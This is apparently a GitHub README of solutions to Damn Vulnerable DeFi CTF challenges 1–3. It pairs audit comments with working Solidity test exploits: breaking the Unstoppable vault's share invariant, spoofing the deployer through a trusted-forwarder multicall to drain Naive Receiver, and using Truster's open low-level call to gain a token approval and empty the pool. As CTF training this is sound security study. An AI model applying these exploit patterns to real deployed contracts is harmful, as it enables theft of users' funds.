# CTF-Defi
Damn Vulnerable DeFi CTF challenges
## 1. Unstoppable
Test file solution:
```
    function test_unstoppable() public checkSolvedByPlayer {
       
        token.transfer(address(vault),1e18);
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);

    }
```

core attack on:
```
convertToShares(totalSupply) != balanceBefore
```
## 2. Naive Receiver
In ```FlashLoanReceiver.sol``` line-15:
```
//@audit-issue access control problem, it ignores the first address which is essentially the initiator of the flash loan
// This means that anyone can request flash loans on behalf of this contract and make it pay the fee to the pool
```
In ```NaiveReceiverPool.sol``` line-87:
```
// @audit-issue We can craft a transaction that comes from the trusted forwarder and since we control the msg.data,
// We can make sure the last 20 bytes are any account that we wish to control.
// That way we can impersonate accounts and perform the withdraw function on their behalf
```

Test file:
```
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas=new bytes[](11);
        for(uint i=0;i<10;i++){
            callDatas[i]=abi.encodeCall(
                NaiveReceiverPool.flashLoan,(receiver,address(weth),0,"0x"));
            
        }
        callDatas[10]=abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER,payable(recovery))
            ),
            bytes32(uint256(uint160(deployer))) 
        );
        bytes memory multicallData=abi.encodeCall(pool.multicall,callDatas);
        BasicForwarder.Request memory request=BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            multicallData,
            1 days
        );
        bytes32 requestHash=keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v,bytes32 r,bytes32 s)=vm.sign(playerPk,requestHash);
        bytes memory signature=abi.encodePacked(r,s,v);

        forwarder.execute(request,signature);
    }
```
## 3. Truster
In ```TrusterLenderPool.sol``` line-28:
```
// @audit-issue This is an open external low-level call,very dangerous
```
Test file:
```
contract TrusterExploiter{
    constructor(TrusterLenderPool _pool,DamnValuableToken _token,address _recovery){
        bytes memory data=abi.encodeWithSignature("approve(address,uint256)",address(this),_token.balanceOf(address(_pool)));
        _pool.flashLoan(0,address(this),address(_token),data);
        _token.transferFrom(address(_pool),_recovery,_token.balanceOf(address(_pool)));
    }
}

 function test_truster() public checkSolvedByPlayer {
        new TrusterExploiter(pool,token,recovery);
    }

```
